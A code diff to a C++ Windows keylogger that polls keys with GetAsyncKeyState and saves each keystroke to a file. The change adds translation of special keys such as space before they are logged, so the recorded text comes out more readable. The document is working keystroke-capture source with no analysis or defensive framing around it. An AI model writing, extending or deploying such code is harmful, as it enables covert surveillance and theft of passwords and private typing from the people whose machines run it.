@@ -16,6 +16,7 @@ void fileData(std::string data) {
 
 std::string specialKey(int keyPressed) {
     std::string translatedKey;
+    translatedKey = "notspecial";
     //Space
     if(keyPressed == VK_SPACE) {
         translatedKey = " ";
@@ -57,9 +58,13 @@ int main() {
             //-32767 specifically so it checks if the least significant bit is set, indicating key was pressed after the call.
             if(GetAsyncKeyState(keyCode) == -32767) {
                 //If its a special key, translate it
-                std::cout << char(keyCode) << std::endl;
-                //Fills the string with 1 of the character array.
-                fileData(std::string(1, char(keyCode)));
+                std::string res = specialKey(keyCode);
+                if(res == "notspecial") {
+                    //Fills the string buffer with 1 copy of the character array.
+                    fileData(std::string(1, char(keyCode)));
+                } else {
+                    fileData(res);
+                } 
             }
             
         }
